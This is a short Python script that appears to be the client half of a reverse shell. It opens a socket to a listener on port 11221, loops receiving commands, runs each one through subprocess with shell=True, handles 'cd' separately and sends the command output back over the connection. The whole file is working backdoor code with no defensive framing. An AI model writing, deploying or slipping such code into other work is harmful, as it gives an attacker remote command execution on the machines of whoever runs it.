#!/usr/bin/python
import socket
import subprocess
import json
import os
import struct
import utils



sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("0.0.0.0", 11221))
while True:
    result = ""
    cmd = utils.receive_frame(sock)
    print(cmd)
    if cmd == "q":
        continue
    elif cmd == "close":
        break    
    elif cmd[:7] == "sendall":
        proc = subprocess.Popen(cmd[8:], shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    elif cmd[:2] == "cd" and len(cmd.strip()) > 3:
        try:
            os.chdir(cmd[3:])
        except:
            continue
    else:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = (proc.stdout.read() + proc.stderr.read()).decode("utf-8")
    utils.reliable_send(sock, result)

sock.close()
